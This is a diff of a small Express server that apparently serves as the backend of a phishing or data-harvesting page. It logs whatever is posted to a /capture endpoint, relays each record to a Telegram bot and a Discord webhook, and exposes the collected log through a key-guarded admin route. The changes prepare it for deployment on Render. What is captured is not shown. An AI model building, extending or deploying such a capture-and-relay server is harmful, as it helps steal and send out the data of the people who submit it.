@@ -7,14 +7,14 @@ const app = express();
 app.use(express.json());
 app.use(express.static('public'));
 
-const LOG = path.join(__dirname, 'captures.log');
-const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
-const TELEGRAM_CHAT  = process.env.TELEGRAM_CHAT;
+const LOG = path.join('/tmp', 'captures.log');   // Render disk is ephemeral — /tmp is fine
+const TELEGRAM_TOKEN  = process.env.TELEGRAM_TOKEN;
+const TELEGRAM_CHAT   = process.env.TELEGRAM_CHAT;
 const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
 
 function logCapture(data) {
   const line = `[${new Date().toISOString()}] ${JSON.stringify(data)}\n`;
-  fs.appendFileSync(LOG, line);
+  try { fs.appendFileSync(LOG, line); } catch (_) {}
 
   if (TELEGRAM_TOKEN && TELEGRAM_CHAT) {
     fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -51,10 +51,10 @@ app.post('/capture', (req, res) => {
 });
 
 app.get('/admin/logs', (req, res) => {
-  const key = req.query.key;
-  if (key !== process.env.ADMIN_KEY) return res.status(403).send('nope');
+  if (req.query.key !== process.env.ADMIN_KEY) return res.status(403).send('nope');
   res.type('text/plain').send(fs.existsSync(LOG) ? fs.readFileSync(LOG, 'utf8') : '');
 });
 
+// Render injects PORT automatically
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`rack-warm on :${PORT}`));
